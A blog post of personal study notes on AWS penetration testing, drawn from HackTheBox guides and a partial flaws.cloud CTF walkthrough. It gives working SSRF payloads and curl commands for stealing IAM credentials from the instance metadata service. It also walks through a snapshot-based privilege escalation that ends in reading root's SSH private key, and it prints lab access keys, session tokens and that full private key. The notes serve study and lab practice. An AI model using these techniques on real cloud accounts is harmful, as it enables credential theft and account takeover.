---
layout: single
title:  "Testing pens in heaven"
header:
  overlay_image: /assets/images/banner.jpg
  show_overlay_excerpt: false
---

<b><i>bruno from the future, don't forget to add an index here when you're done</i></b>



# Pentesting cloud environments

It seems there aren't many resources on cloud pentesting, so I decided to take matters into my own hands. I won't create any new learning material, instead I'll aggregate the best free resources I can find. Any CTFs or practical exercises I complete will be documented, as well as any notes I take on theoretical material.

This is more or less the usual process I take whenever I learn a new topic from online resources, only this time I'll be making it public. I'll be focusing on the cloud provider AWS.


## The plan

* Introductory material
  * <a href="https://www.hackthebox.com/blog/intro-cloud-pentesting">Introduction to Cloud Pentesting</a>
  * <a href="https://www.hackthebox.com/blog/aws-pentesting-guide">AWS penetration testing</a>

* CTFs and hands-on material
  * <a href="http://flaws.cloud/">flaws.cloud</a>
  * <a href="http://flaws2.cloud/">flaws2.cloud</a>
  * <a href="https://pwnedlabs.io/">pwnedlabs.io</a>
  * <a href="https://app.hackthebox.com/fortresses/7">HTB Fortress: AWS</a>
  * <a href="https://github.com/RhinoSecurityLabs/cloudgoat">CloudGoat 2.0</a>
  * <a href="https://github.com/ine-labs/AWSGoat"> AWSGoat</a>

## Other links

* Cheatsheets and references
  * <a href="https://docs.aws.amazon.com/cli/latest/reference/#cli-aws">AWS CLI Documentation</a>
  * <a href="https://hackingthe.cloud/">Hacking The Cloud</a>
  * <a href="https://cloud.hacktricks.wiki/en/index.html">HackTricks Cloud</a>
  * <a href="https://github.com/kh4sh3i/cloud-penetration-testing">kh4sh3i's Cloud pentesting cheatsheet</a>
  * <a href="https://github.com/carnal0wnage/weirdAAL/wiki">WeirdAAAL: AWS Attack Library</a>

* Tools
  * <a href="https://github.com/NetSPI/aws_consoler">AWS Consoler: Convert CLI credentials into console access</a>
  * <a href="https://github.com/zer1t0/awsenum">awsenum: Enumerate AWS permissions and resources</a>
  * <a href="https://github.com/andresriancho/enumerate-iam">Enumerate IAM: Enumerate permissions associated with a credential set</a>
  * <a href="https://github.com/prowler-cloud/prowler">Prowler: Perform automatic security assessment</a>
  * <a href="https://github.com/nccgroup/ScoutSuite">Scout Suite: Highlights risk areas from gathered configuration data</a>


<br>

# Introductory material
## Introduction to cloud pentesting
* The most common cloud security problems are excessive permissions and several kinds of misconfigurations such as ignoring default settings, exposing sensitive data or simply misunderstanding how things work
* A major problem is publicly exposing S3 buckets, there are "search engines" for publicly accessible data in the cloud such as <a href="https://buckets.grayhatwarfare.com/">GrayHat Warfare</a>

<br>

* Try to interact with any S3 buckets you find, for example `https://megabank-supportstorage.s3.amazonaws.com/index-3-1-1144x912.jpg`
  * List files with `aws s3 ls s3://megabank-supportstorage --recursive`
  * Download files (recursively) with `aws s3 sync s3://megabank-supportstorage/pentest_report/ --recursive`

<br>

* **Compute Instance Metadata** is a cloud service which provides administrative endpoints, it's usually bound to the internal IP `169.254.169.254`
* **IMDSv2** will require token authentication to call these endpoints, but not the default **IMDSv1**
* Especially useful when exploiting an SSRF vulnerability, such as `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/`, this will reveal metadata values

<p align="center">
  <img src="https://github.com/user-attachments/assets/264b0f02-be76-413b-9eaa-850347dd32d3" />
</p>

* Browsing to .../iam/info with the endpoint `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/iam/info`

<p align="center">
  <img src="https://github.com/user-attachments/assets/7c4bee36-fbac-4cf5-88c6-a3c9843dab56" />
</p>

* Fetch the credentials attached to the EC2 instance with `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/support`, which reveals the `AccessKeyId`, `SecretAccessKey` and an AWS STS token.
<p align="center">
  <img src="https://github.com/user-attachments/assets/c0baf073-60af-44e6-b13c-a4b05f469e3d" />
</p>

* Use **`aws configure`** to use these credentials, which will save them to `~/.aws/credentials`
* For the session token, use **`aws configure set aws_session_token <token>`**
* Check current identity and privileges, respectively, with **`aws sts get-caller-identity`** and **`aws iam list-attached-user-policies --user-name support`**

<br>

* **S3 buckets** and **Azure/GCP storage buckets** are low hanging fruit but can contain SSH keys, passwords or other sensitive information that might help infiltrate the target (similar to an FTP server if you will)
* Privilege escalation within a cloud service can be useful, not just in the cloud environment as a whole

## AWS penetration testing
Similar to other types of penetration testing, the scoping process should include questions such as:
* How many non-standard AWS IAM policies exist?
* Which services are used?
* How many IAM policies are assigned?
* How many accounts exist?

Keep the **Shared Responsibility Model** in mind: security of the cloud is AWS's responsiblity, security in the cloud is the customer's responsibility

Remember AWS's <a href="https://aws.amazon.com/security/penetration-testing/">policy for penetration testing</a>

<br>

Start by **identifying the attack surface**, determining which services are:
* Used by the application
* Externally exposed
* Managed by AWS or by the customer

Also **enumerate** and **fingerprint** the cloud infrastructure for used components and third-party software. Just like with a web or infra penetration test. **AWS Identity and Access Management (IAM)** can be an interesting source of information

<br>

A few **AWS-specific reconnaissance techniques**:
* Searching the AWS Marketplace for the target organization as teh accountid may be disclosed
* Brute-forcing the account ID via the AWS Sign-In URL: **`https://<accountid>.signin.aws.amazon.com`**
* Searching through public snapshots (i.e EBS snapshots) or AMI Images

<br>

Regarding the **local filesystem**, other tasks besides the typical, non-cloud checks, are:
* Discovery of AWS Access Credentials in home directories and application files
* Verifying access to the **AWS metadata enpoint** at **`https://169.254.169.254/`** or **`http://[fd00:ec2::254]`**

<br>

**AWS Security Tokens** provide temporary, limited-privilege access directly for AWS IAM users or within AWS services. This poses the risk that an attacker could re-use these tokens.

Credentials can be requested via the **AWS metadata service** (see above), which holds different kinds of information split into different categories. The most interesting ones are:
* **iam/info**, containing informaiton about associated IAM roles
* **iam/security-credentials/role-name**, containing temporary security credentials associated with the role

If **Metadata Service Version 2 (IMDSv2)** is used, a token must be crafted. This prevents simple SSRF attacks. But if a user is compromised, you might be able to request an API token from the metadata service 
```
[www-data@manager ~]$ TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

[www-data@manager ~]$ echo $TOKEN
AQAAAPjZig94ZtF4xhBwgAATxNGTMMY5Xx6Bu2Hs2Fqp-St5WebEqQ==

[www-data@manager ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document
{
  "accountId" : "124253853813",
  "architecture" : "x86_64",
  "availabilityZone" : "eu-central-1a",
  "billingProducts" : null,
  "devpayProductCodes" : null,
  "marketplaceProductCodes" : null,
  "imageId" : "ami-0c0d3776ef525d5dd",
  "instanceId" : "i-067fa056e678575c6",
  "instanceType" : "t2.micro",
  "kernelId" : null,
  "pendingTime" : "2023-02-21T10:30:41Z",
  "privateIp" : "172.31.17.24",
  "ramdiskId" : null,
  "region" : "eu-central-1",
  "version" : "2017-09-30"
}
```

The token can then be used for more juicy requests to the service
```
[www-data@manager ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info
{
  "Code" : "Success",
  "LastUpdated" : "2023-02-21T10:30:44Z",
  "InstanceProfileArn" : "arn:aws:iam::124253853813:instance-profile/ServerManager",
  "InstanceProfileId" : "AIPAWA6NVTVY3D6FKNVMM"
}

[www-data@manager ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ServerManager
{
  "Code" : "Success",
  "LastUpdated" : "2023-02-21T10:30:16Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAWA6NVTVYRAJE4MWO",
  "SecretAccessKey" : "DvwdhlDdP13AnTPSgkk5LpToQSQGehcA3JK94gAG",
  "Token" : "IQoJb3JpZ2luX2VjECMaDGV1LWNlbnRyYWwtMSJHMEUCIG9N8Fiy/2ew8j5egLDkoeqF5V3wPwK4jGe4cLAktbaPAiEA7Lo0iVA66CG8aEqNowjAmf4WpaY7dlikuOSXUEfiZ5Uq3wQIvP//////////ARAAGgw0MTQzNTg4MDU4NzMiDBmFU+syY8xirSbpHSqzBKUBkhtt3XJnGJdkbjRY6lywCQnlw8ANYcelnRP00P3dlyIb+QRHhCX4HLuYT7tzytaCNSRHmoEhuPebzxnQOqGVZNT03fseOGdlodl2tA+eX6RIRRwbYoe1TL/CZDltqR84EM7QNsODtTtsXc6LWbnDQH5aY8IhSCGNMyLThcuWxXHz1xXsJpyoSQD5gu1jeRi5wcZceF2P5A+anCV2PGxYGcc8PY4e2ySfL43pWVWJ20et7+lWFUoQgmf6jyiBr6SYr8c76/E98bndzQBnNIoUVjNuUDAvj4x/orFY1onssKMIH8ZUawodh1Q6jw3FTQjSf4rba/aNA4a6vZAnrrUNOsprmoZjv3yx6yHF3g5crL5FX5jPkzSvsz3tOZ9sYUu3g3h3TUjrdlZhA6z2yo/AK7XD7CHa1xwc8FOagBBqRYfGyrL7TNPZXa2EyQkfhI++9EzL4Wpbih/zcVVnlKUfJl610O3X3hJHst6rj6TZAuMP05g8LHdqdIkACFDmcCARKNL7I6KFFPS0sgLqYsu3FkrN55ZXXW4EmvdrnBTmdPfSL9hh77BbLH0uWQU1KhvI5fTmDnUGU24sUF/WQYQQKZShJ0sH82ivEmVFkD7157926d5Hensomg2spNoIXYj+uFGp/iAA9ySEQhz/WGqTJH/GBrp13e0smOusYdU75hg2aax3SPO3m25V29p6WjEajmPpbNkrgHqXXDxqiwF8awNDRuXl0pyPsM00RaW3o/tvMNS60p8GOqkB4S+G+taayWybv6Am85Ae7pSqwfMknjwBZfOTvTbVCydV2RpcZyv1gjqJhOguZZAQzv6rADK2OeBN0bmnNPxY4Om36AQ8eGdpZbs2naGBdCioV5UyLE99Y6dpI9881UG+i9i2qs0EclJLUOgxCdJIlV8j4AgURs2SZeuxfo5ZanG3LubP9BJGGLbLwo5CPDTHA0usGEDYZD1l0A5Ln6mB0EjB2py+g0Omew==",
  "Expiration" : "2023-02-21T17:05:44Z"
}
```

To leverage the extracted secrets in the AWS CLI, fill in **~/.aws/credentials**

```
[default]
aws_access_key_id = ASIAWA6NVTVY5CNUKIUO
aws_secret_access_key = wSHLoJrGVnjfo+xxKwt1cblFpiZgWF20DMxXpTXn
aws_session_token = IQoJb3JpZ2luX2VjECEaDGV1LWNlbnRyYWwtMSJIMEYCIQCnZUyvONtQlYo9E7wvsBQp5yozH/EiPnO4BoXXajyIiwIhAMsOP10IS+ItChhHgzvKMprEPJkKpWl5GKTH3hInYv6gKt8ECLr//////////wEQABoMNDE0MzU4ODA1ODczIgyan7zp7MCE5SEbGO4qswTx/skDLRfBDHMnkXE9rzH7YXvEjXchuasGVywChi9vFyoujll7wc3gmts+LRrgrTC+lV5p/uDC3iHloXiPuEgf6YDRB0OoX4J9jKooGxBAmbdhyvL6kivHlywONtLE8mcf3SrC3ZZqyJ/5KQX+NWNt8Vj1GC/HNssYuToHOLExmUsm5Pw3VgElvcgRaovgU3hwQGLBh7gXCFzp4rAW57jaOcARGQJQr/ONYzgSIZ9LNqMjSBZwREVmTJVhzrDbz7AoPdERnz+K374jd/s+3k7ujBgYxOlk/0Osl7J2+79Wj5+7TDfQXulic/bEwJdCdFX1gcpN5CG3uXnQZQ1USwX4Zb6TSPvHutOOpDjX9pvG2qPt7QC5SV3EuDSOLNvPVrFExOKJcaQhryhZW56hHBpUyVkl5USV2KiAPaniJ6RjYewBX844ddYYaJGp9UEQSxovXPh0mwEKenVTegi3db1bMPkX0CT7IS4GO6bv71/++zQp+pl3fOvp9ixbAa3vzbawLQvpENHpDyRH9K6UT1VPFGK4tbgmrUmBytYp1SKc5UvEDJFg51htlk19MXO3F3fSUWPB5kuo6AEpxnzqElWagBVwswgt6hh0spVjm7PAoO7xTm9yfEc60li/RYGnT4PRQmlbiXiB/sdHVcM29Fmkg7aKo013z06OYNuzIF+Bldf2ziuL8rFM1aU0Af77lUNgpAto0A38iY3a1vBr9xpUJ6ZaXVxMXCbIKG8vTZ94P4f8+TD2idKfBjqoAT5RSXeKY76pZ+P1vOIE+btQjCYsqFzhQwDsk06w+9G89Pa5dVMvhOI0NT0foZeX7aJFhcHigrC5pPkooNQ0wBm1waotdwDTPEKAOwL8HHvtUiuohdR6kYNxKwzqt6g61HcNVd2qzoxf31uDMquXq3OdvcPZHR4LyitKGcptgjQ21ZzcIiuqsqg4k879O8D8v4U3GBSQk7B5UK/2pVKPmqLs/X4cTxUkmQ==
```
<br>

Moving on to the enumeration of **AWS Security Token Permission**, below is a way to first check if the credentials are valid, and then if the user has permissions to run **iam:list-attached-role-policies**

```
[www-data@manager ~]$ aws sts get-caller-identity
{
    "Account": "124253853813", 
    "UserId": "AROAWA6NVTVY4Q3ND6536:i-067fa056e678575c6", 
    "Arn": "arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6"
}

[www-data@manager ~]$ aws iam list-attached-role-policies --role-name ServerManager
An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6 is not authorized to perform: iam:ListAttachedRolePolicies on resource: role ServerManager because no identity-based policy allows the iam:ListAttachedRolePolicies action
```

Permissions can be bruteforced with <a href="https://github.com/andresriancho/enumerate-iam">enumerate-iam</a>. **dynamodb:describe_endpoints** is <a href="https://docs.aws.amazon.com/timestream/latest/developerguide/Using-API.endpoint-discovery.how-it-works.html">a false positive</a>, but the credentials do have access to **ec2:DescribeVolumes** and **ec2:CreateSnapshot** (I don't understand how we know about the latter from the output 🤔).

```
[www-data@manager enumerate-iam-master]#./enumerate-iam.py --access-key ACCESS_KEY --secret-key SECRET_KEY --session-token SESSION_TOKEN
2023-02-23 14:10:27,443 - 3545 - [INFO] Starting permission enumeration for access-key-id "ASIAWA6NVTVYRAJE4MWO"
2023-02-23 14:10:28,083 - 3545 - [INFO] -- Account ARN : arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6
2023-02-23 14:10:28,084 - 3545 - [INFO] -- Account Id  : 124253853813
2023-02-23 14:10:28,084 - 3545 - [INFO] -- Account Path: assumed-role/ServerManager/i-067fa056e678575c6
2023-02-23 14:10:28,933 - 3545 - [INFO] Attempting common-service describe / list brute force.
2023-02-23 14:10:35,937 - 3545 - [INFO] -- dynamodb.describe_endpoints() worked!
2023-02-23 14:10:36,799 - 3545 - [INFO] -- sts.get_caller_identity() worked!
2023-02-23 14:10:43,106 - 3545 - [INFO] -- ec2.describe_volumes() worked!
```

<br>

Time to **escalate privileges**. An attack path with these privileges is to first list available volumes of the EC2 machines (**ec2:DescribeVolumes**) and then create a publicly available snapshot (**ec2:CreateSnapshot**) of the volume. If a volume is publicly available, this means another AWS user can spin up an EC2 instance and attach the snapshot to their own machine as a second hard drive.

```
[www-data@manager ~]$ aws ec2 describe-volumes
{
    “Volumes”: [
        {
            “AvailabilityZone”: “eu-central-1a”, 
            “Attachments”: [
                {
                    “AttachTime”: “2023-02-21T06:58:45.000Z”, 
                    “InstanceId”: “i-067fa056e678575c6”, 
                    “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
                    “State”: “attached”, 
                    “DeleteOnTermination”: true, 
                    “Device”: “/dev/xvda”
                }
            ], 
            “Encrypted”: false, 
            “VolumeType”: “gp2”, 
            “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
            “State”: “in-use”, 
            “Iops”: 100, 
            “SnapshotId”: “snap-01c4670c36a9740ea”, 
            “CreateTime”: “2023-02-21T06:58:45.361Z”, 
            “MultiAttachEnabled”: false, 
            “Size”: 8
        }
    ]
}
```
Note the **`VolumeID`** to create a snapshot of it later
```
[www-data@manager ~]$ aws ec2 create-snapshot –volume-id vol-02ca4df63c5cbb8c5 –description ‘Y-Security rocks!’
{
    “Description”: “Y-Security rocks!”, 
    “Tags”: [], 
    “Encrypted”: false, 
    “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
    “State”: “pending”, 
    “VolumeSize”: 8, 
    “StartTime”: “2023-02-21T10:40:05.770Z”, 
    “Progress”: “”, 
    “OwnerId”: “124253853813”, 
    “SnapshotId”: “snap-06eedc6a7403eda54”
}
```

When creating a new instance in the same region, the snapshot can be found by searching by the **`OwnerID`**

<p align="center">
  <img src="https://github.com/user-attachments/assets/ac941322-2ecb-4fe4-a21f-5597ad412f59" width="40%">
</p>


After launching the instance, mount the snapshot and access the filesystem to steal root's SSH private key

```
[ec2-user@ip-172-31-31-6 ~]$ sudo mount /dev/sdb1 /media/

[ec2-user@ip-172-31-31-6 ~]$ sudo ls /media/root/.ssh
authorized_keys  id_rsa  id_rsa.pub

[ec2-user@ip-172-31-31-6 ~]$ sudo cat /media/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEApNvZpkpiPqs6vdoGUXTfnv/ZtS0jk8rOrwi+3B8Kg7D4B4Yx
m31QJGD2t8RUEyjlrqpvoQ5tiq+s0xmxZzBioB2mFTzqV0DzyIZ3+zCHKn07tw26
N+67bWq88LTIHbadUfBiKRg4M9GnX8p1R2n2e9gIIxkBVBEQFmqMuVpg/3Yczww1
9MrpMHEEr0fJWbIr9Sc+1x+smZiJjAvgqGa2GZh0SLv05aVuXOGlpemx2CnFMGM/
9bisIRRgKQCMJqYh/cXf69qv9VL0CLHYh1TdSN87ZnWZeb/KNKd5iETTg5s2C6Jj
13NnNrea+GNYr3xLCUqACFQik1HVTH4ZPLJmvwIDAQABAoIBAB05pDHoidYWQMmb
NveFwobLUGrf36i5kT5STJN1JUYHP1EGJxEre+OXFOWq9kSXQXBfYn6osh6d2gNq
UJq8Zx9/YgvtypVBPHZV8DsldTDBFq7yzgpQVgWloG0Df15VGzqFZMFoO75j8kn2
+Cd6z2lQ+NBQBH5EsBdpOB07umpO2xmPbaBYa51+bFeRjvV8qhf01RrbovwrbeWr
qsr4aUgaOBpvIyszFM+q5ZkBAugLeYyPvKP3/fpEWtgIq4L+0Sch75srQ/ahYLQe
dQjGi0BTCqwWvoglHfID76r6jPSovyLKGY5wGlgUTSouHCEoAVkSsWb2vd/5IUns
ISx5ifECgYEA07vqFKyI1RenI5ZehH9l4uKXAH5bysibK4mkR7WSzKmP26cpkaib
NRqB+EaZlUHHnI+ZkGYxh/DKrCo888DDiS/W7zA0muqcBpU3tInDHYdKa9s2wkL+
lYytWVaVFTHN19omAQRlGaNxtJ8jBe9Nd1+sIMpvKoIkFqRfVX0asxsCgYEAx1Mn
nNBulvDy6WHvx5WDg4oD/ajSvKuFfyAd/bi3s6lVwejv6XeDxGoWOr/mZAuDCyUO
aGUTMhCYNedUavg7nTZl9LgPVuJROs3h2toaRqJJE8hh/per38DVuzXpkGqes+s2
OD3MwR8itHOIXsD5I5S6kOpsa5oJXAzJr672cS0CgYBDa16J3rZjQ/jQeBz4i6hh
qkzyt0l7NI1UO6u3ubVYvdU01/GAk/N34UzpRXG5+Qwaag83z5KN+rpOP9TQuNyK
XlVOLEdT3Mh5wCHQtt0OFfo4hcDV8ocmD3lTLSKjcQxeYvQe9stKcqTOIq4AQcak
8C3a8xqaqn3bR9OjYQaTaQKBgQCcNO62ViJU6D915uqi3ulSDLdT8xo0Abd9CQ53
6GsOwYYTkRlzPdZl9z20jO9hOCRad4/zAEMq2RZwJ/pgWmldq2P7hMOAs5w1GWQG
vyYYdNYQStmBTBvGHrlhHb8NDoGRPqQfL09niZ8JDAGzQEf/Om97YjvVl8H+AYeN
xvAbgQKBgQCAji3zHMwRlh3J2az/vfIY79c1uerNMCNBsFrLH5e9D8Cx+Tq+mWiA
WjGvoMRN0a/mxpqX1WyPDEuwNoT547VnXNo2fKsZjsvqmjMGg5wFh4ERhFczb6gg
+0NbI8C71hiJMqDrYSvax4augU617PfzpR63PIWGxcc8oQe3L6F+kQ==
-----END RSA PRIVATE KEY-----
```

<br>

# CTFs and hands-on material
## flaws.cloud
```
Scope: Everything is run out of a single AWS account, and all challenges are sub-domains of flaws.cloud.
```

### Level 1
```
This level is *buckets* of fun. See if you can find the first sub-domain.
```

Checking if the website is hosted in an S3 bucket
```
┌──(kali㉿kali)-[~]
└─$ nslookup flaws.cloud                                           
Server:         10.0.2.3
Address:        10.0.2.3#53

Non-authoritative answer:
Name:   flaws.cloud
Address: 52.92.152.19
<snip>
                             
┌──(kali㉿kali)-[~]
└─$ nslookup 52.92.152.19
19.152.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
```

And trying to list files inside the S3 bucket. Note how to `--no-sign-request` signals we're trying to access the bucket as an anonymous user
```
┌──(kali㉿kali)-[~]
└─$ aws s3 ls flaws.cloud                             
Unable to locate credentials. You can configure credentials by running "aws configure".
                                                                                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ aws s3 ls flaws.cloud --no-sign-request
2017-03-13 22:00:38       2575 hint1.html
2017-03-02 22:05:17       1707 hint2.html
2017-03-02 22:05:11       1101 hint3.html
2024-02-21 20:32:41       2861 index.html
2018-07-10 11:47:16      15979 logo.png
2017-02-26 19:59:28         46 robots.txt
2017-02-26 19:59:30       1051 secret-dd02c7c.html
```

Curling the secret file, level 1 is solved
```
┌──(kali㉿kali)-[~]
└─$ curl flaws.cloud/secret-dd02c7c.html
<snip>
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>

Level 2 is at <a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</a> 
```
<br>

### Level 2
```
The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.
```

Using the same technique works to verify that it is indeed an S3 bucket
```
┌──(kali㉿kali)-[~]
└─$ nslookup level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud       
Server:         10.0.2.3
Address:        10.0.2.3#53

Non-authoritative answer:
Name:   level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
Address: 52.92.164.11

<snip>                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nslookup 52.92.164.11                                       
11.164.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
```

But anonymous access no longer works. This will require setting up an AWS account

<TBC>

<br>

### Level 3



<br>

### Level 4



<br>

### Level 5



<br>

### Level 6



<br>

## flaws2.cloud

## pwnedlabs.io

## HTB Fortress: AWS

## CloudGoat 2.0

## AWSGoat
  


